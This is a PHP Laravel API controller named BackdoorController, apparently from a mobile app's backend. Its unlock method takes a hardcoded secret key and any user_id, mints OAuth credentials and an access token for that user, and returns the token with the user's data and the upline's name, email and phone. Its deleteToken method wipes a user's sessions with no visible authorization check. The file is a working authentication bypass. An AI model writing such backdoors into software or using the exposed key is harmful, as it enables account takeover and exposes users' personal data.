<?php

namespace App\Http\Controllers\Api\v1;

use App\OauthSession;
use Illuminate\Http\Request;

use App\Http\Requests;
use App\Banner;
use App\Helpers\Products;
use App\Http\Controllers\Controller;
use App\User;
use App\OauthClient;
use App\OauthClientSecret;

class BackdoorController extends Controller
{
    public function unlock(Request $request)
    {
        if ($request->has('key') && $request->has('user_id') && $request->key === 'dcQn7DMsXrLcUQZyA2BVWU2X7QfcBRSN') {
            $response = [];
            $user = User::find($request->user_id);
            // $oauthClient = OauthClient::firstOrCreate([
            //     'id' => $request->client_id,
            //     'secret' => $request->client_secret,
            //     'name' => $request->client_name
            // ]);
            $oauthClientSecret = OauthClientSecret::where('user_id', '=', $request->user_id)->first();
            if (!$oauthClientSecret) {
                $clientId = $this->getClientId();
                $clientSecret = $this->getClientSecret();
                $oauthClientSecret = OauthClientSecret::create([
                    'user_id' => $request->user_id,
                    'client_id' => $clientId,
                    'client_secret' => $clientSecret,
                    'device_type' => $request->client_name,
                    'device_id' => 'v.2',
                ]);
                $newOauthClient = new OauthClient();
                $newOauthClient->id = $clientId;
                $newOauthClient->secret = $clientSecret;
                $newOauthClient->name = $request->client_name;
                $newOauthClient->save();
            }
            $parameters = array(
                'grant_type=client_credentials',
                'client_id=' . $oauthClientSecret->client_id,
                'client_secret=' . $oauthClientSecret->client_secret
            );
            $parameters = implode('&', $parameters);
            $curl = curl_init();
            $options = [
                CURLOPT_URL => route('api.token_setAccessToken'),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => "",
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 60,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => "POST",
                CURLOPT_POSTFIELDS => $parameters,
            ];
            curl_setopt_array($curl, $options);
            $token = curl_exec($curl);
            $token = json_decode($token, true);
            $err = curl_error($curl);

            if ($err) {
                $response['status']['code'] = 400;
                $response['status']['confirm'] = 'failed';
                $response['status']['message'] = 'Failed get token';
                return $response;
            }
            $token['client_id'] = $oauthClientSecret->client_id;
            $token['client_secret'] = $oauthClientSecret->client_secret;
            $token['refresh_token'] = '';
            $this->setConfig();
            $this->setBanners();
            $response['status']['code'] = 200;
            $response['status']['confirm'] = 'success';
            $response['status']['message'] = 'Success get token';
            $response['details']['token'] = $token;
            $response['details']['user'] = $user;
            $response['details']['upline']['name'] = $user->parent->name;
            $response['details']['upline']['email'] = $user->parent->email;
            $response['details']['upline']['phone'] = $user->parent->address->phone;
            $response['details']['config'] = $this->getConfig();
            $response['details']['banners'] = $this->getBanners();
            $response['details']['url_android'] = 'https://play.google.com/store/apps/details?id=com.droid.sip';
            $response['details']['url_ios'] = 'https://appsto.re/id/m9pjkb.i';
            return $response;
        }
        return response('Unauthorized.', 401);
    }

    public function deleteToken($id)
    {
        $user = User::find($id);
        if ($user) {
            $clientSecrets = $user->client_secrets;
            foreach ($clientSecrets as $clientSecret) {
                OauthSession::where('client_id', '=', $clientSecret->client_id)->delete();
                $response['status']['code'] = 200;
                $response['status']['confirm'] = 'success';
                $response['status']['message'] = 'Success delete token';
                return $response;
            }
            $response['status']['code'] = 400;
            $response['status']['confirm'] = 'failed';
            $response['status']['message'] = 'client not found';
            return $response;
        }
        $response['status']['code'] = 400;
        $response['status']['confirm'] = 'failed';
        $response['status']['message'] = 'User not found';
        return $response;
    }

    public function setConfig()
    {
        return $this->config = Products::status()->get();
    }

    public function getConfig()
    {
        return $this->config;
    }

    public function getBanners()
    {
        return $this->banners;
    }

    public function setBanners()
    {
        return $this->banners = Banner::where('status', 1)->orderBy('id', 'desc')->get();
    }

    public function getClientId()
    {
        $clientId = null;
        while (true) {
            $clientId = str_random(40);
            if (OauthClientSecret::where('client_id', $clientId)->first() === null) {
                break;
            }
        }
        return $clientId;
    }

    public function getClientSecret()
    {
        $clientSecret = null;
        while (true) {
            $clientSecret = str_random(40);
            if (OauthClientSecret::where('client_secret', $clientSecret)->first() === null) {
                break;
            }
        }
        return $clientSecret;
    }
}
